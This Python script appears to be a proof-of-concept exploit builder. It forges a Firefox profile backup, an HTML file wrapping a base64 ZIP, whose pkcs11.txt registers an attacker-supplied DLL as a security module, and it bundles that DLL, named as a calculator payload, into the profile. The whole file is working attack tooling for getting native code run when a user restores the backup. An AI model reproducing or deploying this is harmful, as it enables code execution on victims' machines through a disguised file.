from __future__ import annotations

import argparse
import base64
import io
import json
import platform
import zipfile
from datetime import datetime, timezone
from pathlib import Path, PurePosixPath


SCHEMA_VERSION = 2
ARCHIVE_VERSION = 1
BUILD_ID = "20260706120035"
APP_VERSION = "152.0.5"


def metadata() -> dict[str, object]:
    return {
        "date": datetime.now(timezone.utc).isoformat().replace("+00:00", "Z"),
        "appName": "firefox",
        "appVersion": APP_VERSION,
        "buildID": BUILD_ID,
        "profileName": "Firefox Restored Profile",
        "machineName": platform.node() or "Firefox-Host",
        "osName": "WINNT",
        "osVersion": platform.version() or "10.0",
        "legacyClientID": "15200500-d15c-4c7f-8000-000000000001",
        "healthTelemetryEnabled": False,
        "usageTelemetryEnabled": False,
        "isSelectableProfile": True,
    }


def nss_escape_path(path: str) -> str:
    return path.replace("\\", "\\\\")


def pkcs11_text(library_path: str) -> str:
    return (
        f"library={nss_escape_path(library_path)}\n"
        "name=Firefox Calculator Module\n"
        "parameters=\n"
        "NSS=\n\n"
    )


def add_directory(archive: zipfile.ZipFile, name: str) -> None:
    normalized = str(PurePosixPath(name)).rstrip("/") + "/"
    info = zipfile.ZipInfo(normalized)
    info.external_attr = (0o40755 << 16) | 0x10
    archive.writestr(info, b"")


def build_zip(dll_path: Path, library_path: str) -> bytes:
    manifest = {
        "version": SCHEMA_VERSION,
        "meta": metadata(),
        "resources": {
            "credentials_and_security": None,
            "preferences": {},
        },
    }
    buffer = io.BytesIO()
    with zipfile.ZipFile(
        buffer, "w", compression=zipfile.ZIP_DEFLATED, compresslevel=9
    ) as archive:
        archive.writestr(
            "backup-manifest.json",
            json.dumps(manifest, separators=(",", ":")).encode("utf-8"),
        )
        add_directory(archive, "credentials_and_security")
        archive.writestr(
            "credentials_and_security/pkcs11.txt",
            pkcs11_text(library_path).encode("utf-8"),
        )
        add_directory(archive, "preferences")
        add_directory(archive, "preferences/chrome")
        archive.writestr(
            "preferences/prefs.js",
            b'user_pref("browser.startup.page", 1);\n',
        )
        archive.writestr(
            "preferences/chrome/firefox_calc_payload.dll",
            dll_path.read_bytes(),
        )
    return buffer.getvalue()


def build_archive(zip_bytes: bytes) -> bytes:
    archive_json = {
        "version": SCHEMA_VERSION,
        "encConfig": None,
        "meta": metadata(),
    }
    json_bytes = json.dumps(archive_json, separators=(",", ":")).encode("utf-8")
    encoded_zip = base64.b64encode(zip_bytes)
    boundary = "----=_Firefox_Backup_NSS_152005"
    markup = (
        f"<!DOCTYPE html>\n<!-- Version: {ARCHIVE_VERSION} -->\n"
        "<html><head><meta charset=\"utf-8\"><title>Firefox Profile Backup</title>"
        "</head><body><h1>Firefox profile backup</h1></body></html>\n"
    ).encode("utf-8")
    mime_prefix = (
        "<!-- Begin inline MIME --\n"
        f"Content-Type: multipart/mixed; boundary=\"{boundary}\"\n\n"
        f"--{boundary}\n"
        "Content-Type: application/json; charset=utf-8\n"
        "Content-Disposition: attachment; filename=\"archive.json\"\n"
        f"Content-Length: {len(json_bytes)}\n\n"
    ).encode("ascii")
    binary_header = (
        f"\n--{boundary}\n"
        "Content-Type: application/octet-stream\n"
        "Content-Disposition: attachment; filename=\"archive.zip\"\n"
        "Content-Transfer-Encoding: base64\n"
        f"Content-Length: {len(encoded_zip)}\n\n"
    ).encode("ascii")
    mime_suffix = (
        f"\n\n--{boundary}\n"
        "---- End inline MIME -->\n"
    ).encode("ascii")
    return markup + mime_prefix + json_bytes + binary_header + encoded_zip + mime_suffix


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--dll", type=Path, required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--library-path", required=True)
    args = parser.parse_args()
    dll_path = args.dll.resolve()
    output_path = args.output.resolve()
    if not dll_path.is_file():
        raise SystemExit(f"DLL not found: {dll_path}")
    output_path.write_bytes(build_archive(build_zip(dll_path, args.library_path)))
    print(output_path)


if __name__ == "__main__":
    main()
